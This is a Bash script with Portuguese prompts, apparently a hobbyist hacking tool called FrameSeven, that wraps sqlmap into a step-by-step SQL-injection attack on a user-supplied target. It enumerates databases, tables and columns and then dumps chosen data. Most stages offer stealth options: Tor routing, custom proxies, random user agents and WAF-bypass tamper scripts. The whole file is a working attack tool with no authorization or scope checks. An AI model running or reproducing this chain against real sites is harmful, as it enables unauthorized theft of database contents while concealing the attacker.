#!/bin/bash
#autor: SaySeven
if [ $USER != "root" ];then
    echo "Você Precisa ser root !! "
    exit
fi

sqlmap=$(dpkg --get-selections | grep -c sqlmap)
if [ "$sqlmap" -eq "0" ]; then
        read -p "Sqlmap não instalado!, desaja instalar [yes/no]?: " yeah
    case $yeah in
        yes)
            apt install sqlmap;;
        y)
            apt install sqlmap;;
        no)
            echo "Sem o Sqlmap, eu não funciono";;
        n)
            echo "Sem o Sqlmap, eu não funciono";;
        *)
           echo "opção invalida"; exit
    esac
fi

tor=$(dpkg --get-selections | grep -c tor)
if [ "$tor" -eq "0" ]; then
    read -p "Tor não instalado!, deseja instalar [yes/no]?: " yeah2
    case $yeah2 in
        yes)
            apt install tor;;
        y)
            apt install tor;;
        no)
            echo "Pulando...";;
        n)
            echo "Pulando...";;
        *)
            echo "opção invalida"; exit
    esac
fi 



cat <<!

    ______   _____      __      __    __    _____    __ ___   ______    _____  _     _    _____  __   __   
    / ____/\ / ___ (    /\_\    /_/\  /\_\  /\___/\  /_/\__/\ / ____/\ /\_____\/_/\ /\_\ /\_____\/_/\ /\_\  
    ) ) __\// /\_/\ \  ( ( (    ) ) \/ ( ( / / _ \ \ ) ) ) ) )) ) __\/( (_____/) ) ) ( (( (_____/) ) \ ( (  
     \ \ \ / /_/ (_\ \  \ \_\  /_/ \  / \_\\ \(_)/ //_/ /_/ /  \ \ \   \ \__\ /_/ / \ \_\\ \__\ /_/   \ \_\ 
     _\ \ \\ \ )_/ / (  / / /__\ \ \\// / // / _ \ \\ \ \_\/   _\ \ \  / /__/_\ \ \_/ / // /__/_\ \ \   / / 
    )____) )\ \/_\/ \_\( (_____()_) )( (_(( (_( )_) ))_) )    )____) )( (_____\\ \   / /( (_____\)_) \ (_(  
    \____\/  \_____\/_/ \/_____/\_\/  \/_/ \/_/ \_\/ \_\/     \____\/  \/_____/ \_\_/_/  \/_____/\_\/ \/_/ 
                                                    FrameSeven Version 1.1 by: SaySeven


!
read -p "Digite a url ou ip do alvo: " alvo
echo ""
echo " 1) Sqlmap padrão "
echo " 2) Sqlmap furtivo "
echo " 3) Sqlmap com Tor "
echo " 4) Sqlmap com proxy personalizado "
echo " 5) Sqlmap bypass + furtivo + tor"

read -p "Escolha uma alternativa: " op
sleep 2

case $op in #Achar bancos
	1) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --dbs --no-cast --answers=ANSWERS;;
	2) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
	3) 
        service tor start; sleep 3; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
	4) 
        read -p "Insira ip do http proxy: " proxy;read -p "insira a porta do proxy: " port; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 --dbs --no-cast --answers=ANSWERS;;
    5)  
        service tor start; sleep 3; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --dbs --no-cast --answers=ANSWERS;;
    *)
        echo "Opção Invalida do sqlmap";exit 
esac

echo ""

read -p "Digite o banco que você deseja proseguir com o ataque: " db
sleep 2

echo " 1) Sqlmap padrão "
echo " 2) Sqlmap furtivo "
echo " 3) Sqlmap com Tor "
echo " 4) Sqlmap com proxy personalizado "
echo " 5) Sqlmap bypass + furtivo + tor"


read -p "Escolha uma alternativa: " op


case $op in # Olhar tabelas
	1) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db --tables --no-cast --answers=ANSWERS;;
	2) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db --tables --no-cast --answers=ANSWERS;;
	3) 
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db --tables --no-cast --answers=ANSWERS;;
	4) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db --tables --no-cast --answers=ANSWERS;;
    5)
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db --tables --no-cast --answers=ANSWERS;;
    *)
        echo "Opção Invalida do sqlmap";exit 
esac

echo ""

read -p "Digite a tabela que você deseja proseguir com o ataque: " tb
sleep 2

echo " 1) Sqlmap padrão "
echo " 2) Sqlmap furtivo "
echo " 3) Sqlmap com Tor "
echo " 4) Sqlmap com proxy personalizado "
echo " 5) Sqlmap bypass + furtivo + tor"


read -p "Escolha uma alternativa: " op


case $op in #Olhar colunas
	1) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
	2) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
	3) 
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
	4) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
    5)
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
    *)
        echo "Opção Invalida do sqlmap";exit 
esac

echo ""

read -p "Digite as colunas que você deseja dumpar: " cl
sleep 2

echo " 1) Sqlmap padrão "
echo " 2) Sqlmap furtivo "
echo " 3) Sqlmap com Tor "
echo " 4) Sqlmap com proxy personalizado "
echo " 5) Sqlmap bypass + furtivo + tor"


read -p "Escolha uma alternativa: " op

case $op in #Dumpar colunas
	1) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
	2) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
	3) 
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
	4) 
        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
    5)
        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
    *)
        echo "Opção Invalida do sqlmap";exit 
esac

service tor stop